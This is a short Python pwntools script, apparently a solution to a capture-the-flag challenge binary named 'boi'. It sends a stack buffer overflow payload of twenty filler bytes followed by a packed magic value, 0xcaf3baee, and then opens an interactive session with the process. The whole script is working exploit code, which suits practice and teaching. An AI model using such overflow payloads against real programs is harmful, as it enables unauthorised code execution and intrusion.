#!/home/ryohz/.pyenv/shims/python

import pwn
import struct

conn = pwn.process("./boi")

payload = b"\x41" * 20 + struct.pack("I", 0xcaf3baee)

conn.sendline(payload)
conn.interactive()
